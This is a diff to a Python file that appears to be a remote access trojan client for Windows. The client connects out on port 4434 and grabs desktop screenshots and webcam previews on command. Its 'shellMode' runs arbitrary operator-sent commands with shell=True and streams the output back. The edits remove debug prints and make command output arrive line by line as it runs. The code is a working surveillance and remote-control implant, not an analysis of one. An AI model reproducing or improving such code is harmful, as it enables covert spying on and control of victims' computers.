@@ -24,7 +24,6 @@ PORT = 4434
 ACTIVE = False
 
 CSIDL_COMMON_APPDATA = 35
-Shell32 = ctypes.windll.shell32
 
 _SHGetFolderPath = windll.shell32.SHGetFolderPathW
 _SHGetFolderPath.argtypes = [wintypes.HWND,
@@ -166,9 +165,7 @@ while 1:
 
                     # Get Desktop Preview
                     elif self.data['mode'] == 'getScreen':
-                        print '1'
                         output = get_screenshot()
-                        print '2'
 
                     # Get Webcam Preview
                     elif self.data['mode'] == 'getWebcam':
@@ -195,13 +192,18 @@ while 1:
                             output = 'dirOpenError'
 
                     elif self.data['mode'] == 'shellMode':
-                        output = run_shell(self.data['payload'])
+                        execproc = subprocess.Popen(self.data['payload'], shell=True,
+                                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        for line in iter(execproc.stdout.readline, ''):
+                            data_send(line, self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])
+                            time.sleep(0.01)
+
+                        output = 'endCommandExecute'
 
                     else:
                         return
 
                     data_send(output, self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])
-                    print 'sent'
 
 
             class BITMAPINFOHEADER(ctypes.Structure):
@@ -645,8 +647,10 @@ while 1:
                     try:
                         execproc = subprocess.Popen(cmde, shell=True,
                                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        cmdoutput = execproc.stdout.read() + execproc.stderr.read()
-                        return cmdoutput
+                        #cmdoutput = execproc.stdout.read() + execproc.stderr.read()
+                        for line in iter(execproc.stdout.readline, ''):
+                            data_send(line, 'shellMode')
+                            time.sleep(0.5)
                     except Exception as e:
                         return str(e)
 
@@ -791,5 +795,4 @@ while 1:
             del GLOBAL_SOCKET
             time.sleep(6)
     except socket.error as e:
-        print e
         time.sleep(5)
